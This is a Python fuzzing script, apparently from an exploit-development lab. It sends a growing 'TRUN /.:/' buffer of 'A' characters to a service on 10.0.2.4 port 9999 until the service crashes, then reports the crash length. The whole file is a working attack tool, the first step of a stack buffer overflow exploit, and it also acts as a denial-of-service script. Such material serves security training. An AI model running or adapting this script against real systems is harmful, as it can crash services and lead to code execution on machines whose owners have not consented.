import socket
from time import sleep
import sys

number_of_char = 100
string_send = "TRUN /.:/" + "A" * number_of_char

while True:
	try:
		my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		my_socket.connect(("10.0.2.4", 9999))
		my_bytes = string_send.encode(encoding = "latin1")
		my_socket.send(my_bytes)
		my_socket.close()

		string_send = string_send + "A" * number_of_char
		sleep(1)

	except KeyboardInterrupt:
		print("Crashed at: " + str(len(string_send)))
		sys.exit()

	except Exception as e:
		print("Crashed at: " + str(len(string_send)))
		print(e)
		sys.exit()

